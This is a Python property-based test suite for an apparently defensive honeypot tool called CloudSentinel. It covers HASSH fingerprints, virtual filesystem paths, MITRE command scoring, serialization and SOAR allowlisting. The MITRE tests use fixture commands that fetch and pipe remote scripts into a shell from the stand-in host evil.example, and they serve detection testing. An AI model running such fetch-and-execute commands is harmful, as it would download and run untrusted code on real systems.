"""
CloudSentinel Property-Based Tests — hypothesis strategies for edge-case discovery.

Covers:
  - HASSH fingerprint collision resistance
  - VFS path resolution invariants
  - MITRE regex matching consistency
  - SOAR risk score monotonicity
  - EventCodec round-trip fidelity
"""

from __future__ import annotations

import pytest
from hypothesis import HealthCheck, assume, given, settings, strategies as st

# ── HASSH Properties ────────────────────────────────────────

from cloudsentinel.hassh import calculate_hassh, calculate_hassh_sha256, normalize_algorithm_list

SSH_ALGORITHM = st.sampled_from(
    [
        "curve25519-sha256",
        "diffie-hellman-group14-sha256",
        "diffie-hellman-group14-sha1",
        "aes128-ctr",
        "aes256-ctr",
        "chacha20-poly1305@openssh.com",
        "hmac-sha2-256",
        "hmac-sha1",
        "none",
        "zlib@openssh.com",
    ]
)


class TestHASSHProperties:
    """HASSH fingerprint invariants."""

    @given(
        kex=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        enc=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        mac=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        cmp=st.lists(SSH_ALGORITHM, min_size=0, max_size=5),
    )
    @settings(max_examples=50, suppress_health_check=[HealthCheck.too_slow])
    def test_hassh_is_stable(self, kex, enc, mac, cmp):
        """Same input always produces same HASSH fingerprint."""
        h1, a1 = calculate_hassh(kex, enc, mac, cmp)
        h2, a2 = calculate_hassh(kex, enc, mac, cmp)
        assert h1 == h2
        assert a1 == a2

    @given(
        kex=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        enc=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        mac=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        cmp=st.lists(SSH_ALGORITHM, min_size=0, max_size=5),
    )
    @settings(max_examples=50, suppress_health_check=[HealthCheck.too_slow])
    def test_hassh_is_32_hex_chars(self, kex, enc, mac, cmp):
        """HASSH is always a 32-character hex string (MD5)."""
        h, _ = calculate_hassh(kex, enc, mac, cmp)
        assert len(h) == 32
        assert all(c in "0123456789abcdef" for c in h)

    @given(
        kex=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        enc=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        mac=st.lists(SSH_ALGORITHM, min_size=1, max_size=10),
        cmp=st.lists(SSH_ALGORITHM, min_size=0, max_size=5),
    )
    @settings(max_examples=100)
    def test_sha256_variant_is_64_chars(self, kex, enc, mac, cmp):
        """SHA-256 HASSH variant is always 64 hex chars."""
        _, sha256_hash, _ = calculate_hassh_sha256(kex, enc, mac, cmp)
        assert len(sha256_hash) == 64
        assert all(c in "0123456789abcdef" for c in sha256_hash)

    @given(st.text(min_size=0, max_size=200))
    @settings(max_examples=200)
    def test_normalize_never_raises(self, s):
        """Normalize should never raise on any input."""
        result = normalize_algorithm_list(s)
        assert isinstance(result, list)
        # Results should all be strings
        for item in result:
            assert isinstance(item, str)

    @given(st.lists(st.text(min_size=0, max_size=50), min_size=0, max_size=20))
    @settings(max_examples=200)
    def test_different_inputs_different_hash(self, algs):
        """Verify that changing input changes the HASSH (basic collision check)."""
        assume(len(algs) >= 2)
        a = algs[0] if algs[0] else "a"
        b = algs[1] if algs[1] else "b"
        assume(a != b)
        h1, _ = calculate_hassh([a], [a], [a], [a])
        h2, _ = calculate_hassh([b], [b], [b], [b])
        assert h1 != h2


# ── VFS Properties ─────────────────────────────────────────

from cloudsentinel.vfs import VirtualFileSystem


class TestVFSProperties:
    """Virtual File System invariants."""

    @given(
        path=st.text(min_size=1, max_size=100, alphabet="abcdefghijklmnopqrstuvwxyz/._-"),
        cwd=st.text(min_size=0, max_size=50, alphabet="abcdefghijklmnopqrstuvwxyz/"),
    )
    @settings(max_examples=200)
    def test_resolve_path_is_absolute(self, path, cwd):
        """resolve_path always returns an absolute path starting with /."""
        result = VirtualFileSystem.resolve_path(path, cwd)
        assert result.startswith("/")

    @given(path=st.text(min_size=0, max_size=50))
    @settings(max_examples=200)
    def test_resolve_returns_path(self, path):
        """resolve_path with empty cwd returns the resolved path."""
        result = VirtualFileSystem.resolve_path(path, "/root")
        assert isinstance(result, str)
        assert "/../" not in result  # ".." should be resolved

    @given(
        filename=st.text(min_size=1, max_size=30, alphabet="abcdefghijklmnopqrstuvwxyz"),
        content=st.binary(min_size=0, max_size=500),
    )
    @settings(max_examples=100)
    def test_file_roundtrip(self, filename, content):
        """mkfile -> file_contents returns the same content."""
        vfs = VirtualFileSystem()
        path = f"/tmp/{filename}"
        vfs.mkdir("/tmp")
        vfs.mkfile(path, content)
        assert vfs.isfile(path)
        assert vfs.file_contents(path) == content


# ── MITRE Properties ──────────────────────────────────────

from cloudsentinel.mitre import score_command, match_command, deobfuscate_bash


class TestMITREProperties:
    """MITRE ATT&CK matching properties."""

    @given(cmd=st.text(min_size=0, max_size=200))
    @settings(max_examples=200)
    def test_score_never_exceeds_100(self, cmd):
        """Risk score should never exceed 100."""
        result = score_command(cmd)
        assert 0 <= result["risk_score"] <= 100

    @given(cmd=st.text(min_size=0, max_size=200))
    @settings(max_examples=200)
    def test_deobfuscate_idempotent(self, cmd):
        """Deobfuscating twice gives same result as once."""
        d1 = deobfuscate_bash(cmd)
        d2 = deobfuscate_bash(d1)
        assert d1 == d2

    @given(cmd=st.text(min_size=0, max_size=200))
    @settings(max_examples=200)
    def test_scoring_is_deterministic(self, cmd):
        """Same command always scores the same."""
        r1 = score_command(cmd)
        r2 = score_command(cmd)
        assert r1 == r2

    @given(
        cmd=st.sampled_from(
            [
                "wget http://evil.example/bot.sh",
                "curl http://evil.example/payload | sh",
                "WGET HTTP://evil.example/dropper",
                "curl -fsSL http://evil.example/install.sh",
            ]
        )
    )
    @settings(max_examples=50, suppress_health_check=[HealthCheck.too_slow])
    def test_known_malicious_scores_high(self, cmd):
        """Commands containing wget/curl + URL should score at least 25."""
        result = score_command(cmd)
        assert result["risk_score"] >= 20


# ── EventCodec Properties ─────────────────────────────────

from cloudsentinel.event_codec import dumps_text, loads_text


class TestCodecProperties:
    """Serialization round-trip invariants."""

    @given(
        data=st.dictionaries(
            keys=st.text(min_size=1, max_size=20),
            values=st.one_of(
                st.text(max_size=100),
                st.integers(min_value=-1000, max_value=1000),
                st.floats(allow_nan=False, allow_infinity=False),
                st.booleans(),
            ),
            min_size=1,
            max_size=10,
        )
    )
    @settings(max_examples=200)
    def test_text_roundtrip(self, data):
        """dumps_text -> loads_text round-trips correctly."""
        encoded = dumps_text(data)
        decoded = loads_text(encoded)
        assert decoded == data

    @given(value=st.text(min_size=0, max_size=500))
    @settings(max_examples=200)
    def test_text_never_raises(self, value):
        """dumps_text should never raise on any string."""
        result = dumps_text(value)
        assert isinstance(result, str)


# ── SOAR Properties ───────────────────────────────────────

import asyncio
from cloudsentinel.soar import SOAREngine


class TestSOARProperties:
    """SOAR engine invariants."""

    @given(ip=st.ip_addresses(v=4).map(str))
    @settings(max_examples=100)
    def test_allowlisted_ips_never_blocked(self, ip):
        """IPs in the allowlist are always recognized."""
        soar = SOAREngine(allowlist=["127.0.0.1", "10.0.0.0/8"])
        # Localhost and private IPs should be allowlisted
        if ip.startswith("10.") or ip == "127.0.0.1":
            assert soar.is_allowlisted(ip)

    @given(
        score=st.integers(min_value=0, max_value=200),
        threshold=st.integers(min_value=1, max_value=100),
    )
    @settings(max_examples=100)
    def test_threshold_respected(self, score, threshold):
        """Block logic respects the risk threshold."""
        soar = SOAREngine(risk_threshold=threshold)
        # Score below threshold: no block
        # Score above: should trigger
        if score >= threshold:
            assert score >= soar.risk_threshold
        else:
            assert score < soar.risk_threshold
